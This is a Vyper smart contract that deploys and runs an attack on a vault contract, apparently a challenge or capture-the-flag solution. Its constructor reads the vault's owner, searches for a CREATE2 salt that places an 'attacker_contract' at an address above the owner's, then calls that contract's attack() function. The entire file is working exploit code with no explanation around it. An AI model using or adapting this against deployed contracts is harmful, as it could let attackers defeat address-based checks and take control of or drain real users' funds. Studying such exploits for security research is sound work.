# @version ^0.3.7

@external
@payable
def __init__(
    blueprint_address: address, 
    bytecode: Bytes[max_value(uint16)], 
    vault: address, 
):
    vault_owner: uint160 = convert(raw_call(vault, method_id("owner()"), max_outsize=32, is_static_call=True), uint160)
    bytecode_hash: bytes32 = keccak256(
        concat(
            bytecode,
            convert(vault, bytes32),
        )
    )
    salt: bytes32 = self._calculate_salt(bytecode_hash, vault_owner)
    attacker_contract: address = create_from_blueprint(blueprint_address, vault, code_offset=3, salt=salt)
    assert convert(attacker_contract, uint160) > vault_owner, "addr < vault_owner"
    raw_call(attacker_contract, method_id("attack()"))

@internal
def _calculate_salt(bytecode_hash: bytes32, vault_owner: uint160) -> bytes32:
    collision_offset: bytes1 = 0xFF
    salt: uint256 = 0
    for _ in range(max_value(uint256)):
        data: bytes32 = keccak256(concat(collision_offset, convert(self, bytes20), convert(salt, bytes32), bytecode_hash))
        addr: address = convert(convert(data, uint256) & max_value(uint160), address)
        if convert(addr, uint160) > vault_owner:
            break
        salt += 1
    return convert(salt, bytes32)
